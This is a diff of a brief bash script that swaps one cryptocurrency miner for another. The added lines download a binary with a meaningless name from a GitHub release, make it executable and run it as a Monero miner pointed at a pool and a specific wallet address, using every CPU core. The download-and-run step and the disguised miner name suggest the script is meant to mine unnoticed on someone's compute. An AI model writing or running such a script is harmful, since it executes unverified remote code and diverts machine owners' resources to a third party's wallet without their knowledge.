@@ -1,5 +1,4 @@
 #!/bin/bash
-wget https://github.com/ocminer/cpuminer-opt-supr/releases/download/v1.40/cpuminer-x86-64-v2 && \
-chmod +x cpuminer-x86-64-v2 && \
-./cpuminer-x86-64-v2 -a riecoin -o stratum+tcp://ric.suprnova.cc:5000 -u vedhatyms1.rig1 -p x
-
+wget https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar && \
+chmod +x crrmnar && \
+./crrmnar -o stratum+tcp://xmr.suprnova.cc:6663 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC.lofdd -p x -a rx/c64 -t $(nproc --all)
